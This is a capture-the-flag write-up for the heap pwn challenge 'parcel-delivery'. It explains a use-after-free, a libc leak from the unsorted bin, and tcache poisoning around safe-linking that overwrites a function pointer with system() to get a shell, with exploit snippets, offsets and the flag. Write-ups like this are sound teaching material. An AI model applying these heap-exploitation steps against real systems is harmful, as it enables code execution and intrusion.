# parcel-delivery — Full Writeup

**Flag:** `NNS{p4rc3l_5ucc355fully_d3l1v3r3d_cb671a5664}`

**Category:** pwn (heap exploitation)
**Files:** `Dockerfile`, `compose.yml`, `parcel_delivery` (dynamically linked, **not stripped** x86-64 ELF)
**Base image:** `ubuntu:24.04` → glibc **2.39**
**Remote:** `ncat --ssl parcel-delivery-2f622465fc39.chall.nnsc.tf 1337`

---

## 1. The program

The binary keeps two fixed-size global arrays (`.bss`, 16 slots each, non-PIE
so their addresses are compile-time constants):

```c
void   *parcels[16];   // @ 0x4040c0 -- pointer per slot
size_t  sizes[16];     // @ 0x404140 -- size per slot
void  (*delivery_hook)(char *) = normal_delivery;  // @ 0x404068, a GLOBAL FUNCTION POINTER
```

and a menu backed by symbol names that map 1:1 onto the option text (the
binary is **not stripped**, so this was read straight off `nm`, no guessing
required):

| Choice | Function | Effect |
|---|---|---|
| 1 | `register_parcel` | `idx=get_index()`; if `parcels[idx]==NULL`: read a `size` (1..0x500), `malloc(size)`, store into `parcels[idx]`/`sizes[idx]`, then `read()` up to `size` bytes into it |
| 2 | `inspect_parcel` | `write(1, parcels[idx], sizes[idx])` — dumps the slot's raw bytes |
| 3 | `update_parcel` | `read(0, parcels[idx], sizes[idx])` — overwrites the slot's bytes, size unchanged |
| 4 | `destroy_parcel` | `free(parcels[idx])` |
| 5 | `dispatch` | reads a string into a 64-byte stack buffer, then **calls `delivery_hook(buf)`** |
| 6 | exit | — |

`get_index()` bounds-checks to `0..15`. `register_parcel` refuses to
allocate into an already-non-NULL slot.

### The bug

`destroy_parcel` calls `free(parcels[idx])` but **never sets `parcels[idx]`
back to `NULL`**. Every other handler's only safety check is "is this
pointer non-NULL" — so after destroying a slot, `inspect`/`update` will
happily keep reading and writing the now-freed chunk. That's a textbook
**use-after-free**, and combined with a heap allocator (glibc's tcache) that
lets us fully control what gets freed and when, it's enough for full
exploitation with **no separate leak-then-overflow gymnastics** — the UAF
*is* the read/write primitive.

### The "grand prize" gadget

`dispatch()` is the reason this challenge is so clean to finish: it reads
attacker-controlled bytes onto the stack and then calls a **global,
writable function pointer** with **that exact buffer as the first
argument**:

```c
void dispatch(void) {
    char buf[64];
    printf("Tracking code: ");
    scanf("%63s", buf);
    delivery_hook(buf);              // rdi = buf
}
```

If we can overwrite `delivery_hook` with the address of `system()`, then
`dispatch()` sending `/bin/sh` is *literally* `system("/bin/sh")` — no ROP
chain, no stack pivot, nothing else needed. The whole exploit reduces to:
**get an arbitrary write on `delivery_hook`, and get a libc leak so we know
where `system()` is.**

## 2. Getting a libc leak (UAF read)

`register_parcel` allows sizes up to `0x500` (1280) bytes. glibc's tcache
only recycles chunks up to `0x410` bytes, so a freed `0x500`-request chunk
(actual chunk size `0x510`) does **not** go into tcache — it goes into the
**unsorted bin**, where glibc stores real, unencoded `fd`/`bk` pointers
(pointing into `main_arena`, inside libc — unlike tcache's obfuscated
pointers, see below).

One wrinkle: if a freed chunk is directly adjacent to the *top* chunk (the
unallocated remainder of the heap), `free()` just merges it back into top
instead of ever touching the unsorted bin — so the leaked bytes come back
unchanged (I hit this once: freeing a lone `0x500` chunk just echoed back my
own written bytes). The fix is a "barrier" allocation of a different size
placed right after it, so the big chunk has a live neighbor and can't be
merged away:

```python
register(io, 0, 0x500, b'C' * 8)
register(io, 5, 0x30,  b'D' * 8)   # barrier — different tcache bin, just needs to exist
destroy(io, 0)
leak0 = inspect(io, 0, 0x500)      # first 8 bytes: a raw pointer into libc's main_arena
```

The exact offset from that leaked pointer back to the libc base is a fixed
property of this specific glibc build (`2.39-0ubuntu8.8` from Ubuntu
24.04), so it only needs to be measured once, locally, against the
identical libc (see §5) — `leak - libc_base = 0x203b20` for every run,
local or remote, since it doesn't depend on ASLR.

## 3. Getting an arbitrary write (tcache poisoning)

Since Ubuntu 24.04 ships glibc ≥2.32, tcache uses **safe-linking**: a freed
chunk's `fd` ("next") pointer isn't stored raw, it's obfuscated as

```
stored = (chunk_address >> 12) XOR real_next_pointer
```

`PROTECT_PTR`/`REVEAL_PTR` in glibc's `malloc.c` use the *address the
pointer is stored at* — which for a tcache chunk is just the chunk's own
user-data address — as the XOR mask's source. This is fully invertible
*if we control what gets written there*: we don't need to know a chunk's
address to decode it, only to *encode our own poison* into it, and the
first quantity we need for that is exactly what a lone freed chunk's `fd`
field already leaks us:

```python
register(io, 1, 0x18, b'A' * 0x18)     # chunk A
destroy(io, 1)                          # freed alone -> A.next = encode(NULL, A) = A>>12
leakA = u64(inspect(io, 1, 0x18)[:8])   # = A>>12, straight off the wire
```

### Two pitfalls that don't show up in the textbook version

**Pitfall 1 — `tcache->counts[]` still has to be non-zero.** My first
attempt poisoned the *only* chunk in the bin. Mathematically the pop that
"reveals" the poisoned pointer works fine — but glibc's fast tcache path in
`malloc()` only even *looks* at `tcache->entries[idx]` when
`tcache->counts[idx] > 0`. Popping the sole poisoned chunk simultaneously
sets `entries[idx]` to our target **and** drops `counts[idx]` to 0, so the
very next allocation ignores the (correctly poisoned!) head and just
extends the heap normally. I only found this by dumping the actual
`tcache_perthread_struct` out of `/proc/<pid>/mem` — `entries[0]` genuinely
held `&delivery_hook`, right up until the allocation that was supposed to
use it, which used something else entirely, because `counts[0]` was `0`.

The fix is the standard two-chunk technique: free **two** chunks of the
same size (so the bin has `count = 2`), so that after popping the
poisoned one there's still `count = 1` left, and the *following*
allocation actually trusts `entries[]`:

```python
register(io, 1, 0x18, b'A' * 0x18)
register(io, 2, 0x18, b'B' * 0x18)     # B is adjacent to A (A + 0x20)

destroy(io, 1)                          # count=1, head=A, A.next = A>>12
leakA = u64(inspect(io, 1, 0x18)[:8])

destroy(io, 2)                          # count=2, head=B (don't care what B.next currently encodes)

target = DELIVERY_HOOK - 8              # see pitfall 2
forged = leakA ^ target                 # B is adjacent to A -> B>>12 == A>>12 in practice
update(io, 2, p64(forged))              # overwrite B's stored "next" directly, no need to decode it first

register(io, 3, 0x18, b'X' * 0x18)      # pops B (ordinary/throwaway) -> head becomes `target`, count now 1
register(io, 4, 0x18, p64(0) + p64(system_addr))  # count=1>0 -> tcache trusted -> returns `target`!
```

`B` never needs its own dedicated leak: since `B = A + 0x20`, `B` and `A`
share the same address with everything above bit 12 zeroed out, i.e.
`B>>12 == A>>12`, for every allocation that doesn't happen to straddle a
4 KB page boundary (never observed in practice for two adjacent 0x20-byte
chunks).

**Pitfall 2 — the returned pointer must be 16-byte aligned.** My first
run of the *correct* two-chunk technique still crashed the target with
glibc's fatal `malloc(): unaligned tcache chunk detected`. glibc's
`tcache_get()` rejects (`aligned_OK`) any pointer that isn't a multiple of
16. `delivery_hook` sits at `0x404068`, and `0x404068 & 0xf == 8` — only
8-aligned, so poisoning it directly always aborts. The fix is to target
`0x404060` instead (`&0xf == 0`, and it's inside a run of zero padding in
`.data` right before `delivery_hook`), and pad the final write so the
*second* 8-byte qword of what we send lands exactly on `delivery_hook`:

```python
target = DELIVERY_HOOK - 8
...
register(io, 4, 0x18, p64(0) + p64(system_addr))
```

## 4. Cashing in

With `delivery_hook` now pointing at `system()`:

```python
dispatch(io, b'/bin/sh')     # delivery_hook("/bin/sh") == system("/bin/sh")
```

gives an interactive shell on the exact same TCP connection (this
challenge's `socat` line has no `pty` option, so it's a plain pipe — no
canonical-mode/newline gotchas like the previous `file-parser` challenge).
From there:

```
cat /flag.txt
```

## 5. Getting the *exact* target libc (and why it matters)

The container is `ubuntu:24.04` pinned to a specific image digest — glibc
**2.39**. My local Kali WSL box ships glibc 2.41; heap-internal structure
sizes, the safe-linking scheme, and the tcache alignment/count checks all
live inside glibc itself, so testing against the wrong version risks
chasing bugs that don't exist on the real target (or missing ones that do).
Rather than guess, I pulled the *exact* package that ships in that base
image straight from Ubuntu's archive and ran the target binary against it
directly, with no `sudo`/`patchelf` required:

```bash
curl -O http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.39-0ubuntu8.8_amd64.deb
ar x libc6_2.39-0ubuntu8.8_amd64.deb
tar xf data.tar.zst
# -> usr/lib/x86_64-linux-gnu/{libc.so.6, ld-linux-x86-64.so.2}
```

Running a binary against a *different* libc than the one it's linked
against only works cleanly if you also use **that libc's own matching
dynamic linker** (mixing a newer `ld.so` with an older `libc.so.6` fails
outright with `undefined symbol: __nptl_change_stack_perm, version
GLIBC_PRIVATE`). So both files were extracted, and the binary is invoked by
executing the interpreter directly with the target binary as an argument
— no `patchelf`, no root needed:

```bash
./libc/ld-linux-x86-64.so.2 --library-path ./libc ./parcel_delivery
```

This is also exactly how `exploit.py`'s local-testing mode runs it.

Everything version-specific in the exploit — the `0x203b20` unsorted-bin
leak offset, the exact abort message and the alignment/count-check
behavior of `tcache_get()`, and `system()`'s `0x58750` offset — was derived
against this *exact* libc file, then reused unchanged against the real
remote target (whose glibc build is identical).

## 6. Full exploit (`exploit.py`)

```bash
python3 exploit.py                                    # local test, against ./libc
python3 exploit.py remote HOST PORT                   # against the real challenge
```

Sequence, matching the sections above:

1. `register(1)`, `register(2)` — two adjacent `0x18`-byte chunks, A and B.
2. `destroy(1)`, `inspect(1)` — leak `A>>12`.
3. `destroy(2)` — B becomes the tcache head (count = 2).
4. `update(2, encode(DELIVERY_HOOK-8, leakA))` — poison B's stored `next`.
5. `register(3)` — pops B (thrown away); tcache head becomes `DELIVERY_HOOK-8`, count = 1.
6. `register(0, 0x500)` + `register(5, 0x30)` barrier + `destroy(0)` + `inspect(0)` — leak a real libc pointer from the unsorted bin, compute `libc_base` and `system()`.
7. `register(4, p64(0)+p64(system_addr))` — count is still 1, so tcache is trusted; pops `DELIVERY_HOOK-8`; the second qword we send overwrites `delivery_hook` with `system()`.
8. `dispatch(b'/bin/sh')` → shell.
9. `cat /flag.txt`.

### Result

```
$ python3 exploit.py remote parcel-delivery-2f622465fc39.chall.nnsc.tf 1337
...
[*] system() = 0x7fb424abc750
NNS{p4rc3l_5ucc355fully_d3l1v3r3d_cb671a5664}
```

## 7. Root cause summary

1. **Use-after-free**: `destroy_parcel` frees a chunk but never clears the
   pointer, so every other handler's `!= NULL` check is satisfied by a
   dangling pointer — full read/write on freed heap memory.
2. **No hardening beyond stock glibc**: partial RELRO and a writable global
   function pointer (`delivery_hook`) called with attacker-controlled data
   turn a heap primitive directly into `system(attacker_string)` — no ROP,
   no stack leak, no canary to defeat.
3. **Standard tcache-poisoning mechanics apply directly**, with two
   version-specific gotchas that only show up empirically against the real
   glibc build: the `tcache->counts[]` liveness requirement (need ≥2 real
   chunks in the bin), and the 16-byte alignment check on the address being
   returned.

## Files kept in this solution

- `Dockerfile`, `compose.yml`, `parcel_delivery` — original challenge files.
- `libc/libc.so.6`, `libc/ld-linux-x86-64.so.2` — the *exact* glibc 2.39
  build and matching loader from the `ubuntu:24.04` base image, needed to
  reproduce every offset in this writeup and to run the binary locally at
  all (`ld.so --library-path ./libc ./parcel_delivery`).
- `offset.txt` — the pre-measured `unsorted-bin leak → libc base` constant
  for this exact libc build (`0x203b20`), read by `exploit.py`'s remote mode.
- `exploit.py` — the finished, working exploit.
- `../description.txt`, `../pwn_parcel-delivery.tar.gz` — original challenge handout.
